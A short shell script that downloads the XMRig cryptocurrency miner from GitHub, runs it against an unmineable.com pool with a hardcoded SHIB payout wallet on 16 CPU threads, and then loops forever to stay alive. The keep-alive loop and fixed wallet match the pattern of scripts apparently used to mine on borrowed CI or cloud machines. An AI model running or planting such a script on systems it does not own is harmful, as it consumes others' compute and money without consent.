#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-x64.tar.gz
tar xf xmrig-6.16.2-linux-x64.tar.gz
./xmrig -o rx.unmineable.com:3333 -a rx -k -u SHIB:0x8bdd5cbd427dc54647613efd7bb7e6848a5ef656 -p x --cpu 16
while [ 1 ]; do
sleep 3
done
sleep 999
